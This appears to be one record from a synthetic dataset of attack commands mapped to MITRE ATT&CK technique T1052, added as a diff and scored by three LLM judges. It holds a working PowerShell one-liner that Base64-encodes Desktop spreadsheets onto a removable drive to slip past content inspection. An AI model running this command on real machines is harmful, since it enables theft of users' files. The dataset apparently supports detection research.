@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\cache\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; Get-ChildItem \"$env:USERPROFILE\\Desktop\" -Include *.xlsx,*.csv -Recurse -ErrorAction SilentlyContinue | ForEach-Object { $b=[IO.File]::ReadAllBytes($_.FullName); [Convert]::ToBase64String($b) | Set-Content -Path (Join-Path $dest ($_.BaseName + \".b64\")) -Encoding ascii }; Write-Output \"Base64-archived Desktop data to $dest at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Base64-encodes spreadsheet data and stores it on a removable drive to evade simple content inspection while keeping all operations local.",
+  "rationale_steps": [
+    "Locate a removable drive for staging",
+    "Enumerate spreadsheet files from the Desktop",
+    "Read bytes and encode data to Base64 before writing to USB",
+    "Log the local operation using Write-Output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-9ff91ae3",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced delimiters, valid cmdlets/parameters (e.g., Select -First -Expand for DriveLetter), proper separators, and correct escaping to construct the removable drive path.",
+        "semantic_score": 5,
+        "semantic_justification": "It identifies a removable drive, creates a staging directory, base64-encodes Desktop spreadsheet files, writes them to the removable media, and logs the action\u2014consistent with T1052 exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.94,
+        "timestamp": "2025-10-01T06:59:37.290309Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes/parentheses/braces, correct variable assignments, pipeline operations, and error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1052 technique by automatically detecting a removable drive, copying spreadsheet files from the user's desktop, encoding them as base64 to evade simple content inspection, and logging the operation - all core elements of exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T06:59:40.367668Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid PowerShell syntax, balanced parentheses and quotes, and proper command separators and flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the claimed intent and T1052 by identifying a removable drive, Base64-encoding target files, and saving them to the removable drive, effectively demonstrating exfiltration over a physical medium with obfuscation.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:59:50.241448Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
